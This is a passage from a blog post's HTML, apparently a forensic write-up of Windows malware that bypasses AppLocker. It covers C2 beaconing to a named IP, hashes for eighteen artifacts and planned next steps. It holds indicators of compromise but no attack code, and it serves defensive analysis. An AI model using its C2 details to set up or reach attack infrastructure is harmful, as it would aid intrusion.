<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/15.jpg data-srcset="/img/malware-applocker-bypass/15.jpg, /img/malware-applocker-bypass/15.jpg 1.5x, /img/malware-applocker-bypass/15.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/15.jpg>
</a><figcaption class=image-caption>beacon PTR</figcaption>
</figure></p>
<p>C2 IP address remains <code>209.141.59.48</code>. The malware creates a TLS 1.2 connection to this IP and sends an encrypted text to the <code>/update</code> endpoint</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/16.jpg title="First Beacon" data-thumbnail=/img/malware-applocker-bypass/16.jpg data-sub-html="<h2>First Beacon</h2><p>First Beacon</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/16.jpg data-srcset="/img/malware-applocker-bypass/16.jpg, /img/malware-applocker-bypass/16.jpg 1.5x, /img/malware-applocker-bypass/16.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/16.jpg>
</a><figcaption class=image-caption>First Beacon</figcaption>
</figure></p>
<p>As it&rsquo;s shown on the screenshot, there is a result string (encoded/encrypted) coming back to the infected box. Immidiately after this response, the malware sends another request to the same endpoint but with significantly more encrypted request data</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/17.jpg title="Second Beacon" data-thumbnail=/img/malware-applocker-bypass/17.jpg data-sub-html="<h2>Second Beacon</h2><p>Second Beacon</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/17.jpg data-srcset="/img/malware-applocker-bypass/17.jpg, /img/malware-applocker-bypass/17.jpg 1.5x, /img/malware-applocker-bypass/17.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/17.jpg>
</a><figcaption class=image-caption>Second Beacon</figcaption>
</figure></p>
<p>The C2 responds with 0 and there&rsquo;s no more connectivity after that for ~30 minutes.</p>
<p>I assume the malware de-activates itself at this point and won&rsquo;t try the next stages of the attack.</p>
<p>Artifact #16 (<code>d74d33c2f619f110b4d6f7f9f0e024e8168fc0cf3903e6bf0628f88f048c53c0</code>, VT N/A) has all the network communication after the <code>msxsl</code> binary&rsquo;s execution.</p>
<p>Extra artifacts for further investigation:</p>
<ul>
<li><code>procmon</code> output in LZ4 archive format (Artifact #17, <code>d9344bda500cd7cd94354387513ba9d83ee03ba558dca1926b09a3e2d734bbf3</code>, VT N/A)</li>
<li><code>fiddler</code> saz output of the SSL-intercepted traffic (Artifact #18, <code>b6dd044686855035e864a67460915ad0e0d7cca5b67dfe22fe2125e65e121871</code>, VT N/A)</li>
</ul>
<h2 id=artifact-summary>Artifact Summary</h2>
<h3 id=artifact1pdf>artifact1.pdf</h3>
<ul>
<li>sha256: <code>1d2d5b2befe5fcfea8e9303d87b92adaaf9f161a82e0e1341008518d1585e81a</code></li>
<li>md5: <code>1839694e527bbf416ad2751a9f0b5e6d</code></li>
<li>sha1: <code>ee3dbf1a8d7852cacfe8879a566410a3d23a993b</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>3072:zAN3kzL4gn6Fac0TZTSEY2ZFvyFvqg0jUvnWKh2ijKlt3o3sbe39liU:zAN3WMgnFTk7B7HN23t48DU,"artifact1.pdf"</code></li>
</ul>
<h3 id=artifact2pcap>artifact2.pcap</h3>
<ul>
<li>sha256: <code>dfed73960bd9aa030cc5d84df18eaf2d295dfa7f990614c53673e74b84034ef5</code></li>
<li>md5: <code>1abaff0ab4b393bbc6f0960a59897a48</code></li>
<li>sha1: <code>1c2a5c684a5fd9954028f86f1a0e67b56727065c</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>48:SlUmQZLUuUYFPUFHA/COlQkZJfokdUCUped3zJro+crcafbGPvWzOkhOYiQEbWUS:TDiShLfok5UkdFronzSn8cYiQEbJI478,"artifact2.pcap"</code></li>
</ul>
<h3 id=artifact3pcap>artifact3.pcap</h3>
<ul>
<li>sha256: <code>38dcef9b23f21a98fe9dde3f5b5eb643292bf41556b7e4d5da30484848c4cf3d</code></li>
<li>md5: <code>213f602384b19747505c65aa5e16bd6e</code></li>
<li>sha1: <code>d5060212d2a80c4e5fad7a5e5a01aef17fad1369</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>192:jfo4fo3DsDGd95d90YfocYfoddod9yDRBhaod9yDRBhxFn9FnF:k9zoK9D90dcdddA9mRyA9mRvbF,"artifact3.pcap"</code></li>
</ul>
<h3 id=artifact4zip>artifact4.zip</h3>
<ul>
<li>sha256: <code>db647308649e2d3815f7d53d024ac50e8dead8a3caf33bc203dac90b5dbb1596</code></li>
<li>md5: <code>c76f546e06ea82c076561ea97ac2270a</code></li>
<li>sha1: <code>802e33ebeafcce2819007aaae56390c85ec926c7</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>24:9Mcohvek0+8eu6EC/ZMyPehaCzw796yh4ZGaUsTe90hDmRLcom:9ahX00HPDCwcyh4fXe9U6Rnm,"artifact4.zip"</code></li>
</ul>
<h3 id=artifact5lnk>artifact5.lnk</h3>
<ul>
<li>sha256: <code>c32bb3eb1634d6765e41fcb7071d1ca2b70bb50dc3cb7c9da84a00427b3dd642</code></li>
<li>md5: <code>3594e583c6c248b48aabc6fed4583d91</code></li>
<li>sha1: <code>855d57fe78a0ad9dd1a8299270fe3495b253a8ca</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>96:8jIDVNOtu1RBYOiEIvMkPKjm6hixCL5PeoTyNGOn0iQ8jRWlHM3oINQ0iC:8DkvihdAP7NBifILIpi,"artifact5.lnk"</code></li>
</ul>
<h3 id=artifact6txt>artifact6.txt</h3>
<ul>
<li>sha256: <code>c7da11e38583d4d8fa0597cc3ac17b24d210b2b59f9c22b1f6f7224a16ea9328</code></li>
<li>md5: <code>129d9918031b84c084e043c122854129</code></li>
<li>sha1: <code>d9dbe51e06f22538a3792eafd515523c526f4d64</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>6144:wihNrKpHapQqjx2lDqSU4POcyH9MGwhOki3KctVw0gs6u:wOKHqjYDNU4SH9Mripw09,"artifact6.txt"</code></li>
</ul>
<h3 id=artifact7pcap>artifact7.pcap</h3>
<ul>
<li>sha256: <code>6b2da53f8bcae0cd99bdae18993bf8d485ac56be33d01af8f18022b9888eebd3</code></li>
<li>md5: <code>6c246bddcf8279985c0ff621868b07f3</code></li>
<li>sha1: <code>88c9d3b55854cda2fe5b5952fae26db2644dca8b</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>12288:2zI+e5o+Au4rujoVjaltIdJvJU7MM9P9A5+PedFXArk1t:x5o+QaltIdqMilA5FdFXArk1t,"artifact7.pcap"</code></li>
</ul>
<h3 id=artifact8js>artifact8.js</h3>
<ul>
<li>sha256: <code>ecd80124a34daf7d8a7a73ee412aabc977313888c8d70c2190b306ed28dc72f9</code></li>
<li>md5: <code>4484b020010c248f61c6993df1fbf6d2</code></li>
<li>sha1: <code>16b1e1af805cd458a34e41444f60d9f990e0f8fd</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>192:AxkCo2BLKP/Nmx+MUnYNQxHY9sKshMK6Cjy+7Xedy9:K43DYyxnp,"artifact8.js"</code></li>
</ul>
<h3 id=artifact9js>artifact9.js</h3>
<ul>
<li>sha256: <code>4dbb4755cbe105673725055f090ff830f042e8809c1a708db5c044f93dbcb6b4</code></li>
<li>md5: <code>d2b8a06a022b73a4ae8df75c244741af</code></li>
<li>sha1: <code>a3ec062421391a0390519ee900c8bcc51bb8b6c4</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>768:sCF8W9WTzbuUKNjtQEjqPZ1RnI1OX1VMD3EuNk8NzDDdKW3snk:rFD46SEuPRIYX1VMLRzDDdj,"artifact9.js"</code></li>
</ul>
<h3 id=artifact10ocx>artifact10.ocx</h3>
<ul>
<li>sha256: <code>229b5cc70f69beb555d787c626674946902307546f266ac7c97a17937f1e6510</code></li>
<li>md5: <code>0599b2e7b791f289ee0d06ff2377435a</code></li>
<li>sha1: <code>c6e7d336d99d8db2ae58d11e0eec442bda41a3a4</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>6144:a3ezgIOdR8wWGJIPRe7zrmoY4InbDArVUDsY:a3eUIOYwXIPAfrqb0a,"artifact10.ocx"</code></li>
</ul>
<h3 id=artifact11doc>artifact11.doc</h3>
<ul>
<li>sha256: <code>ce638eb65e8e8a54becb218f05ba0aadbaded36fc0152591dc3e62b080c46c85</code></li>
<li>md5: <code>535d83f131ba08c523512a18c9b310e6</code></li>
<li>sha1: <code>e5eb26c81ded2c2e713df761ed6f001dec773a59</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>192:wtR8NslLZEvA+6/6rrILd/Kf3HO8tWOkGr:wJ8iSUR/8dWKr,"artifact11.doc"</code></li>
</ul>
<h3 id=artifact12pbk>artifact12.pbk</h3>
<ul>
<li>sha256: <code>a0c2b522a86e729467d27cf98bd3c9a5264ebc1e1d5113d2bf2040423578d66b</code></li>
<li>md5: <code>9f59df97ada61db10a74ea07b7263d5d</code></li>
<li>sha1: <code>e47c5c731886eccdac8609529f5dc1ad400fc2cd</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>48:2DrjkD9RG7A3yXpX6OdLXA0WwSJg+VyJutq1qGpfE2xuaHL:2HjkZRE7Z9LXynyQTgf5uaHL,"artifact12.pbk"</code></li>
</ul>
<h3 id=artifact13exe>artifact13.exe</h3>
<ul>
<li>sha256: <code>35ba7624f586086f32a01459fcc0ab755b01b49d571618af456aa49e593734c7</code></li>
<li>md5: <code>3e9f31b4e2cd423c015d34d63047685e</code></li>
<li>sha1: <code>8b516e7be14172e49085c4234c9a53c6eb490a45</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>384:DM/xa/pTv+bPHVvo+U14c9UVhFwlGttTZvxqzCp9pqX8D+c2CWDuhe1w5GJ:g/KTvqHJo+24c9UVFyC5yw2nu4J,"artifact13.exe"</code></li>
</ul>
<h3 id=artifact14txt>artifact14.txt</h3>
<ul>
<li>sha256: <code>28141035e19e63f051f4634ba1b00074a272c6e7af73f736de76859d69e49e86</code></li>
<li>md5: <code>65aad2e12dec70ccb18e143a376ae305</code></li>
<li>sha1: <code>ca4c23cb35dcd04d5ad0299fa3c845b06a955a64</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>24:2lxoAp3FgqYwfyGTgRgYFJ9b/nqa9hA19GhY53hQ96YNoNYNQA9ViG53iGVc2n5l:2lpFN5OBmCqOu86KaKQsZ7SwFWGvkJU9,"artifact14.txt"</code></li>
</ul>
<h3 id=artifact15txt>artifact15.txt</h3>
<ul>
<li>sha256: <code>31e6d6d746c53438670f2f2944320a94cbaf8f7df37a01a21fbd08c6c05ed48c</code></li>
<li>md5: <code>e1c1d823aed43011eae867c089f92a05</code></li>
<li>sha1: <code>8e2d4f81b992a0514d1eda8bbde18777e2af5a11</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>1536:q5AVrs7xXZt48AH1HJe21B046b53L4hvKXZ1iERA:VVrcptylLB7w5swriEi,"artifact15.txt"</code></li>
</ul>
<h3 id=artifact16pcap>artifact16.pcap</h3>
<ul>
<li>sha256: <code>d74d33c2f619f110b4d6f7f9f0e024e8168fc0cf3903e6bf0628f88f048c53c0</code></li>
<li>md5: <code>11aace8e3115ba808b533026834f4e35</code></li>
<li>sha1: <code>78154bdaef7e35dcc6054b8a8d2bc94873d6152e</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>6144:+PRNswLk/O/irAxZ7GADfj/OpcM9EVmVdcuRhqSi6gESoSVguk/8iEeBhMTB2mKr:+X2nrAXGOfjvM9EBuI6gIl/8iEbwufa,"artifact16.pcap"</code></li>
</ul>
<h3 id=artifact17mpllz4>artifact17.MPL.lz4</h3>
<ul>
<li>sha256: <code>d9344bda500cd7cd94354387513ba9d83ee03ba558dca1926b09a3e2d734bbf3</code></li>
<li>md5: <code>c6d2b0d965af657e5da6bc430bf611f2</code></li>
<li>sha1: <code>a6cf16c9c61d4b4370f1b7862c62e40e6271c079</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>393216:GyOowPrBaQAI4VTZykBMZT4hiZGYeNKbtr6u5qRp2tNQPbNb1teh7nxcRD:GyOowPBwZyk66AZGYeMtqRp4yR1cln0,"artifact17.MPL.lz4"</code></li>
</ul>
<h3 id=artifact18saz>artifact18.saz</h3>
<ul>
<li>sha256: <code>b6dd044686855035e864a67460915ad0e0d7cca5b67dfe22fe2125e65e121871</code></li>
<li>md5: <code>1915a328837a6fe5edba9d71ee309a87</code></li>
<li>sha1: <code>8eff22b35f0fd88ac3a36812c80f41eb6cc07eb4</code></li>
<li>ssdeep,1.1&ndash;<code>blocksize: hash :hash,filename</code>: <code>12288:sE9UBtovVaM/X8KGjJPQNIWZwBiWz2rD9JJdz:58GvVlXNSnWGiWz2tPdz,"artifact18.saz"</code></li>
</ul>
<h2 id=next-steps>Next steps</h2>
<ul>
<li>Identification of the attack vector responsible for such a sephosticated attack</li>
<li>Looking for the C2 IP inside known TI feeds</li>
<li>Decryption of C2 comms and potentially unlocking next stages</li>
</ul>
<h1 id=references>References</h1>
<p><a href=https://app.any.run/tasks/e282c2ed-0140-40a9-ae4e-19dbe8801646/ target=_blank rel="noopener noreffer">Anyrun of the sample</a>
[Similar Attack techniques]https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/</p>
</div><div class=post-footer id=post-footer>
<div class=post-info>
<div class=post-info-line>
<div class=post-info-mod>
<span>Updated on 2020-10-13</span>
</div>
<div class=post-info-license></div>
</div>
<div class=post-info-line>
<div class=post-info-md></div>
<div class=post-info-share>
<span></span>
</div>
</div>
</div>
<div class=post-info-more>
<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/malware/>malware</a>,&nbsp;<a href=/tags/windows/>windows</a>,&nbsp;<a href=/tags/applocker/>applocker</a>,&nbsp;<a href=/tags/forensics/>forensics</a>,&nbsp;<a href=/tags/lol_binaries/>LOL_binaries</a>,&nbsp;<a href=/tags/mitre/>mitre</a></section>
<section>
<span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span>
</section>
</div>
<div class=post-nav><a href=/2020/09/2020-09-28-sshmfahook/ class=prev rel=prev title="SSH MFA using Slack/Teams/Discord"><i class="fas fa-angle-left fa-fw"></i>SSH MFA using Slack/Teams/Discord</a>
<a href=/2020/12/2021-12-28-sunburst-defend/ class=next rel=next title="Basic guidelines that would've prevented SUNBURST">Basic guidelines that would've prevented SUNBURST<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id=comments><div id=disqus_thread class=comment></div><noscript>
Please enable JavaScript to view the comments powered by <a href=https://disqus.com/?ref_noscript>Disqus</a>.
</noscript></div></article></div>
</main><footer class=footer>
<div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
</div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Ali Mosajjal</a></span></div>
</div>
</footer></div>
<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top">
<i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments">
<i class="fas fa-comment fa-fw"></i>
</a>
</div><script type=text/javascript src=https://n0p-me.disqus.com/embed.js defer></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{},search:{highlightTag:"em",maxResultLength:10,noResultsFound:"No results found",snippetLength:30}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-114664513-1',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-114664513-1" async></script></body>
</html>